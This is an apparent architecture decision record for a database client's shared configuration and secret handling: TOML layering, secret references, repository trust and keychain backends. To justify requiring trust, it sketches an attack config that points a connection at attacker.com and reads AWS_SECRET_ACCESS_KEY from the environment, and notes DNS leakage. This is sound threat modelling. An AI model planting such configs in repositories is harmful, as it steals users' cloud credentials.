# ADR-009: Shared configuration and secrets

- **Status:** Accepted
- **Date:** 2026-11-02

## Context
Connections, tunnels and folders must be version-controllable in git without secrets. The
app rewrites the configuration when editing from the UI, so diffs must stay readable.

## Decision
- **TOML**, rewritten with `toml_edit` to preserve comments and order. (YAML ruled out:
  ambiguities and an abandoned `serde_yaml`.)
- One file per connection and per tunnel; folders = directories; stable IDs;
  `schema_version` in every file.
- **Layers:** project/team (repo) → user (`~/.config/spelunkdb`, outside the repo) →
  environment variables. `${user.name}` variables resolved from the user layer.
- **Secrets by reference:** `keychain` (`keyring` crate), `env:VAR`, `op://…`
  (1Password CLI), `vault://…`. They are resolved when connecting, live in memory and never
  go to logs or to the MCP.
- **Repository trust:** whatever runs commands (secret provider by command, hops with an
  external command) requires explicit trust the first time.
- JSON Schema generated from the Rust types (`schemars`).
- Linux without Secret Service: fall back to `env:`/`op://` with a warning; no homemade
  encrypted files.
- **Sync:** git only.

## Implementation (2026-11-02, `crates/spelunk-config`)
- **Broader trust:** not only what runs commands. A repository connection is not resolved
  at all until the repository is trusted: `host = "attacker.com"` and
  `password = { secret = "env:AWS_SECRET_ACCESS_KEY" }` (or even `${env:…}` in the host,
  which would leak through DNS) would be enough to steal secrets. Personal connections do
  not need it. Trust is stored by canonical path, as in VS Code.
- Personal directory per platform: `%APPDATA%\spelunkdb` (Windows),
  `~/Library/Application Support/spelunkdb` (macOS), `~/.config/spelunkdb` (Linux). It holds
  `user.toml` (`[vars]`), personal `connections/` (ids with `~/`) and
  `trusted-workspaces.toml`.
- Secret references: `keychain`, `keychain:<name>`, `env:<VAR>`, `op://…`, `cmd:<command>`
  and `prompt`. `keychain` without a name uses the `<id>/password` entry; if it does not
  exist, it is asked for and storing it is offered. Vault is left for later.
- Files with `deny_unknown_fields`: a typo (`databse`) is an error with line and column,
  not an ignored field. A broken file does not prevent loading the rest.
- Relative paths (SQLite, `tls.ca`, keys) hang from the repository root; `~/` is the home
  directory.
- JSON Schema generated in `schema/` and checked by a test.
- Keychain with `keyring-core` and one store per platform: Credential Manager (Windows),
  Keychain (macOS) and Secret Service through libdbus (Linux). Neither the `zbus` variant,
  which pulls in unmaintained crates (RUSTSEC-2026-0370/0371/0372), nor `dirs` (MPL-2.0
  license through a dependency, for something that is a few lines) is used.

## Example
```toml
# .spelunk/connections/orders-prod.toml
schema_version = 1
name = "Orders (prod)"
engine = "postgres"
env = "prod"
host = "orders-db.internal"
database = "orders"
user = "${user.db_user}"
password = { secret = "keychain" }
tunnel = "bastion-eu"

[mcp]
exposed = true
max_rows = 500
```

## Revisit if
Target users demand YAML: it would only be accepted as an import.
